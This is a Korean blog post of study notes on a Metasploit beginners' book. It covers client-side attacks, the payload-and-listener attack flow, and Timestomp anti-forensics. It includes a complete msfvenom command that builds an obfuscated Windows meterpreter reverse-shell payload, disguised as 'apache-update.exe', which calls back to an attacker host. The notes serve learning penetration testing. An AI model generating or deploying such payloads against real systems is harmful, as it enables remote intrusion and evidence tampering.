---
layout: post
title: "Metasploit for Beginners 메모"
categories: [보안, 취약점스캐너]
tags: [취약점, 스캐너, metasploit]
toc: true
last_modified_at: 2023-10-06 17:15:00 +0900
---

# 개요
- Metasploit for Beginners(저자 Sagar Rahalkar) 책을 보고 일부 메모한 파일이다. 
- https://www.amazon.com/Metasploit-Beginners-threat-free-best-class/dp/1788295978
- Metasploit 입문서로서는 아주 좋다. 쉽게 쓰여져 있고 알아야할 기본적인 내용은 다 써있다. 

# Client-side Attacks
- Client-side attack이란 각 개별 유저를 노리는 공격을 총칭한다. 예들 들어 공격자가 웹 사이트에서 멀웨어 코드가 임베드된 DOC, PDF, XLS등을 불특정 유저에게 다운로드시킨다음에 유저가 해당 파일을 실행하면 동작하는 타입의 공격이다. 
- 이런 타입의 공격은 기존의 공격 형태 (글로벌 IP를 가진 서버를 대상으로 하는 형태)와는 달리, 예를들어 라우터 뒤에 있는 특정 조직의 사내 서버라던가 조직내의 PC를 공격할 수 있다는 특징이 있다. 

## 공격 흐름
Client-side attack의 공격흐름은 다음과 같다. 
1. msfvenom을 사용해서 페이로드를 만든다.
2. incomming 커넥션을 처리하기 위한 리스너를 시작한다. 
3. victim에게 페이로드를 보낸다. 
4. 리버스 세션을 기다린다. 

## 페이로드 생성 
### Msfvenom 
예전에는 Metasploit에 msfpayload 와 msfencode 만 존재했다. msfpayload는 시스템을 공격하기 위한 페이로드가, msfencode는 그 페이로드를 숨기기위한 obfuscate기능이 있다. 이 두가지 기능을 합친것이 최근에 등장한 msfvenom 이다. 

### 커맨드 
다음 커맨드를 사용해서 페이로드를 만든다. 

```sh
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
LHOST= 192.168.44.134 LPORT= 8080 -e x86/shikata_ga_nai \ 
-f exe -o /root/Desktop/apache-update.exe
```

각 옵션의 의미는 다음과 같다. 

- -a x86: x86아키텍처상에서 동작하는 페이로드를 만든다. 
- --platform windows: 페이로드가 동작하는 플랫폼은 windows이다. 
- -p windows/meterpreter/reverse_tcp: 페이로드는 reverse TCP로 동작하는 meterpreter이다. 
- -e x86/shikata_ga_nai: 페이로드 인코더는 shikata_ga_nai를 사용한다. 
- -f exe: 아웃풋 포맷은 exe이다. 
- -o /root/Desktop/apache-update.exe: 만들어진 페이로드가 저장될 경로이다. 

# Anti-forensics
## Timestomp 
- Timestomp 툴을 사용해서 파일의 생성시간, 갱신시간등을 덮어쓰기할 수 있다. 
- 그런데 윈도우즈에서 파일의 시간데이터를 덮어쓰는 것은 어려운 일일까?
- [여기](https://tfl09.blogspot.com/2020/12/how-to-change-file-time-for-windows-file.html)를 보면 파워셸로 가능한 것 같다. 